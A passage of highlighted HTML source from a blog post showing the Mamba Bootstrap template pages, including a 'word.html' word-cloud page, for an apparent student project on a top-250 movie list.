class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="word-html"><a href="#word-html" class="headerlink" title="word.html"></a>word.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span>   <span class="token comment">&lt;!-- ======= About Us Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>about<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>about<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row no-gutters<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 video-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/word.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img-fluid<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 d-flex flex-column justify-content-center about-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>词频统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>根据250部电影的一句话描述，提炼出词云<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-box<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bx bx-fingerprint<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>关于电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>What did you learn?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End About Us Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. 